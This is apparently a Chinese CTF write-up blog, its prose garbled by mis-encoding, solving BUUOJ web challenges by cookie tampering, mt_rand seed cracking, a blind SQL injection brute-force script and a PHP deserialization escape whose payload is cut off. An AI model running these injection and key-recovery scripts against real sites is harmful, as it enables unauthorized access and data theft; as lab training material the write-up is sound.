<h3 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h3><p>å¼€é¢˜ï¼Œflagéœ€è¦100å—ï¼ŒæŠ“åŒ…ï¼Œcookieæ˜¯ä¸€æ®µbase64åŠ å¯†çš„æ•°æ®ï¼Œè§£å¯†ä¸€ä¸‹ï¼Œæ˜¯jsonæ ¼å¼çš„æ•°æ®ï¼ŒæŠŠmoneyæ”¹æˆ100ï¼ŒåŠ å¯†ï¼Œæ‰“è¿‡å»å°±å¯ä»¥ä¹°flagäº†</p>
<h3 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h3><p>å¼€é¢˜ï¼Œä»€ä¹ˆéƒ½ç‚¹ä¸äº†ï¼Œæ‰«æç›®å½•ï¼Œæœ‰å‘ç°</p>
<img src="/2020/06/04/buuoj5/7.png" class="">

<p>ä¸‹è½½<a href="http://www.zipå‹ç¼©åŒ…ï¼Œå°±ä¸€ä¸ªindex.phpæ–‡ä»¶" target="_blank" rel="noopener">www.zipå‹ç¼©åŒ…ï¼Œå°±ä¸€ä¸ªindex.phpæ–‡ä»¶</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&#39;Content-type:text&#x2F;html; charset&#x3D;utf-8&#39;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_POST[&#39;login&#39;]))&#123;</span><br><span class="line">    $username &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">    $Private_key &#x3D; $_POST[&#39;Private_key&#39;];</span><br><span class="line">    if (($username &#x3D;&#x3D; &#39;&#39;) || ($password &#x3D;&#x3D; &#39;&#39;) ||($Private_key &#x3D;&#x3D; &#39;&#39;)) &#123;</span><br><span class="line">        &#x2F;&#x2F; è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span><br><span class="line">        header(&#39;refresh:2; url&#x3D;login.html&#39;);</span><br><span class="line">        echo &quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    else if($Private_key !&#x3D; &#39;*************&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        header(&#39;refresh:2; url&#x3D;login.html&#39;);</span><br><span class="line">        echo &quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if($Private_key &#x3D;&#x3D;&#x3D; &#39;************&#39;)&#123;</span><br><span class="line">        $getuser &#x3D; &quot;SELECT flag FROM user WHERE username&#x3D; &#39;crispr&#39; AND password &#x3D; &#39;$password&#39;&quot;.&#39;;&#39;; </span><br><span class="line">        $link&#x3D;mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">        mysql_select_db(&quot;test&quot;,$link);</span><br><span class="line">        $result &#x3D; mysql_query($getuser);</span><br><span class="line">        while($row&#x3D;mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; genarate public_key </span><br><span class="line">function public_key($length &#x3D; 16) &#123;</span><br><span class="line">    $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $public_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;genarate private_key</span><br><span class="line">  function private_key($length &#x3D; 12) &#123;</span><br><span class="line">    $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $private_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key &#x3D; public_key();</span><br><span class="line">  &#x2F;&#x2F;$Public_key &#x3D; KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</span><br></pre></td></tr></table></figure>

<p>å‰é¢æ˜¯ä¸€ä¸ªç®€å•çš„sqlæ³¨å…¥ï¼Œè¦ç”¨å…¬é’¥æ¨å‡ºç§é’¥ï¼Œçœ‹ä»£ç å¯ä»¥å‘ç°ï¼Œç§é’¥æ˜¯ç”±mt_randå‡½æ•°ç”Ÿæˆçš„ï¼Œè¦çˆ†ç ´ç§å­ï¼Œæœä¸€ä¸‹php_mt_rand-masterå·¥å…·ï¼Œä¸‹è½½ä¹‹åæ”¾åˆ°kaliä¸­ï¼Œç”¨ä¹‹å‰çœ‹ä¸€ä¸‹readme.md</p>
<img src="/2020/06/04/buuoj5/8.png" class="">

<p>å…ˆåˆ›å»ºå·¥ç¨‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -Wall -march&#x3D;native -O2 -fomit-frame-pointer -funroll-loops -fopenmp php_mt_seed.c -o php_mt_seed</span><br></pre></td></tr></table></figure>

<p>å†ç”¨ä¸‹é¢è„šæœ¬ç”Ÿæˆå·¥ç¨‹èƒ½è®¡ç®—çš„æ•°æ®</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"KVQP0LdJKRaV3n9D"</span>; <span class="comment">//å…¬é’¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#<span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥çš„ç»“æœæ˜¯1775196155</p>
<img src="/2020/06/04/buuoj5/9.png" class="">

<p>æŠŠç§å­å¸¦å›åˆ°ä»£ç ä¸­ç®—å‡ºç§é’¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> public_key() . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="comment">#KVQP0LdJKRaV3n9D</span></span><br><span class="line"><span class="comment">#XuNhoueCDCGc</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªæ˜¯ç§é’¥ï¼Œåˆ°login.htmlç™»å½•ä¸€ä¸‹ï¼Œè´¦å·å°±æ˜¯crisprï¼Œå¯†ç ç”¨ä¸‡èƒ½å¯†é’¥ï¼Œå¡«å…¥ç§é’¥ï¼Œç™»å½•ï¼Œflagåˆ°æ‰‹</p>
<h3 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h3><p>æŠ½å¥–ç¨‹åºï¼Œç»™äº†ä¸€éƒ¨åˆ†ç§é’¥ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œæ‰¾åˆ°äº†check.phpï¼Œè®¿é—®é¡µé¢ï¼Œç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>OK7HlAYF4</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>

<p>åˆæ˜¯ä¸€é“ç”¨mt_srandéšæœºåˆ†å‘ç§å­çš„é¢˜ç›®ï¼Œæ ¹æ®[MRCTF2020]Ezauditçš„ç»éªŒï¼Œåº”è¯¥åˆæ˜¯è¦ç”¨php_mt_sandå·¥å…·è¿›è¡Œç ´è§£ï¼Œå…ˆå°†5OK7HlAYF4è½¬æ¢æˆå·¥å…·èƒ½å¤Ÿè·‘çš„æ•°æ®ï¼Œè¿™é‡Œå°±ä¸è´´è½¬æ¢è„šæœ¬äº†ï¼Œä¸Šé¢æœ‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">31 31 0 61 50 50 0 61 46 46 0 61 33 33 0 61 43 43 0 61 11 11 0 61 36 36 0 61 60 60 0 61 41 41 0 61 30 30 0 61</span><br></pre></td></tr></table></figure>

<img src="/2020/06/04/buuoj5/10.png" class="">

<p>å¯ä»¥çœ‹åˆ°æ˜¯php7.1.0ä»¥ä¸Šç‰ˆæœ¬çš„ï¼Œç”¨php7.1.0ä»¥ä¸Šçš„ç‰ˆæœ¬æ¥è·‘å‡ºç§é’¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">31829466</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/06/04/buuoj5/11.png" class="">

<p>ä¸å‰é¢ç»™çš„éƒ¨åˆ†å®Œç¾åŒ¹é…ä¸Šäº†</p>
<img src="/2020/06/04/buuoj5/12.png" class="">

<h3 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h3><p>é¢˜ç›®ä¸€çœ‹å°±çŸ¥é“æ˜¯sqlæ³¨å…¥ï¼Œéšæ‰‹è¯•ä¸€ä¸‹ä¸‡èƒ½å¯†é’¥ï¼Œå¼¹çª—hacker</p>
<p>ç›®å½•æ‰«æï¼Œå‘ç°æœ‰robots.txtï¼Œè®¿é—®ç»™äº†hint.txt</p>
<img src="/2020/06/04/buuoj5/13.png" class="">

<p>å¯ä»¥å‘ç°æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨ç”¨åˆ°çš„å‡½æ•°åŸºæœ¬éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªregexpï¼Œè¿™é‡Œè¿˜è¦ç”¨æ³¨é‡Šç»•è¿‡ï¼Œç›´æ¥ä¸Šè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += hex(ord(i))</span><br><span class="line"></span><br><span class="line">    result = result.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + result</span><br><span class="line">url = <span class="string">"http://63d4e709-46a6-462c-b28a-07eed7cc3219.node3.buuoj.cn/"</span></span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_/!|'</span>]</span><br><span class="line"><span class="comment"># print(string)</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        passwd = ord2hex(<span class="string">'^'</span> + res + chr(j))</span><br><span class="line">        <span class="comment"># print(passwd)</span></span><br><span class="line">        passwd = <span class="string">'||passwd/**/REGEXP/**/&#123;&#125;;\x00'</span>.format(passwd)</span><br><span class="line">        print(passwd)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"\\"</span>,</span><br><span class="line">            <span class="string">'passwd'</span>: passwd</span><br><span class="line">        &#125;</span><br><span class="line">        r = req.post(url, data=data, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            res += chr(j)</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<img src="/2020/06/04/buuoj5/14.png" class="">

<p>è·‘å‡ºäº†ç™»å½•å¯†ç ï¼Œè´¦å·éšä¾¿å¡«ï¼Œæºç éªŒè¯é‚£å—åªè¦æ±‚passwdæ˜¯å’Œadminçš„passwdç›¸ç­‰å°±å¯ä»¥äº†</p>
<p>ç™»å½•æ‹¿åˆ°flag</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buuojdiary</title>
    <url>/2020/02/26/buuojdiary/</url>
    <content><![CDATA[<p>[0CTF piapiapia]<a id="more"></a></p>
<p>å‰å‡ å¤©iæ˜¥ç§‹çš„æ¯”èµ›é‡Œé¢æœ‰ä¸€é“ååºåˆ—åŒ–é€ƒé€¸çš„é¢˜ç›®ï¼Œå¯¹äºèœé¸¡è€Œè¨€çœŸçš„æ˜¯ä¸€è„¸æ‡µé€¼ï¼Œåæ¥çœ‹äº†å‡ºé¢˜äººçš„å‡ºé¢˜ç¬”è®°ï¼Œæ‰¾åˆ°äº†è¿™é“é¢˜ï¼ŒåºŸè¯ä¸å¤šè¯´ï¼Œè¿›å…¥æ­£é¢˜ã€‚</p>
<p>åˆ†æï¼šæ‰«æç›®å½•ï¼Œå¯ä»¥ä»è¿”å›ä¸­æ‰¾åˆ°<a href="http://www.zipï¼Œä»è€Œèƒ½å¤Ÿå¾—åˆ°ç½‘ç«™çš„é€»è¾‘å’Œæºç " target="_blank" rel="noopener">www.zipï¼Œä»è€Œèƒ½å¤Ÿå¾—åˆ°ç½‘ç«™çš„é€»è¾‘å’Œæºç </a></p>
<p>(1)æ³¨å†Œ (2)ç™»å½• (3)ä¿®æ”¹ä¿¡æ¯</p>
<p>config.phpä¸­å†…å®¹:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">	$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">	$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">	$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">	$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚çŸ¥é“äº†éœ€è¦è¯»å–config.phpæ¥æ‹¿åˆ°flag</p>
<p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹profile.phpæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">		$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>

<p>ä»ä»£ç æ¥çœ‹,æ‰€è¦åšçš„åº”è¯¥å°±æ˜¯è®©$profile[â€˜photoâ€™]=â€™profile.phpâ€™ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªååºåˆ—åŒ–ï¼Œé‚£ä¹ˆåº”è¯¥å°±æ˜¯è¦åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´æ¥è¯»å–profile.phpï¼Œè¿™æ ·å°±èƒ½å¾—åˆ°base64åŠ å¯†è¿‡çš„ä¿¡æ¯</p>
<p>å†æ¥çœ‹update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">		$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">		$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">		$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">		$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºphoneã€emailã€nacknameã€photoéƒ½æ˜¯å¯ä»¥è¿›è¡Œæ“ä½œçš„</p>
<p>åœ¨è®¾ç½®äº†profileçš„ä¿¡æ¯ä¹‹åä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œå¤„ç†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨filteræ–¹æ³•ä¸­è¿›è¡Œäº†è¿‡æ»¤ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„ä¸œè¥¿ï¼Œå°±æ˜¯æ ¹æ®æ ‘å“¥çš„blogæ¥åšçš„ï¼Œæ ¹æ®é‚£ç¯‡æ–‡ç« è¿™é“é¢˜çš„ç‚¹åº”è¯¥åœ¨nicknameè¿™é‡Œ,å¯ä»¥çœ‹åˆ°filterä¸­ä¼šç”¨hackeræ¥æ›¿ä»£æ•°ç»„é‡Œçš„ä¸œè¥¿ï¼Œä¹Ÿå°±æœ‰whereçš„åœ°æ–¹å°±ä¼šæŒ¤å‡ºå­—ç¬¦</p>
<p>ç¬¬ä¸€ä¸ªé•¿åº¦é™åˆ¶å¯ä»¥ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡,ä¹Ÿå°±æ˜¯nickname[]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ¥çœ‹ä¸€ä¸‹æ­£å¸¸åºåˆ—åŒ–çš„ç»“æœ:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">Array</span>(</span><br><span class="line"> <span class="string">'phone'</span> =&gt; <span class="string">'12345678911'</span>,</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'woc2@qq.com'</span>,</span><br><span class="line">    <span class="string">'nickname'</span> =&gt; [<span class="string">'hello'</span>],</span><br><span class="line">    <span class="string">'photo'</span> =&gt; <span class="string">'upload/'</span>.md5(<span class="string">'123.jpg'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//a:4&#123;s:5:"phone";s:11:"12345678911";s:5:"email";s:11:"woc2@qq.com";s:8:"nickname";a:1&#123;i:0;s:5:"hello";&#125;s:5:"photo";s:39:"upload/f47454d1d3644127f42070181a8b9afc";&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨è¦åšçš„å°±æ˜¯å¾€nicknameé‡Œå¡å…¥profile.phpï¼Œç›´æ¥ç»™payloadï¼š</p>
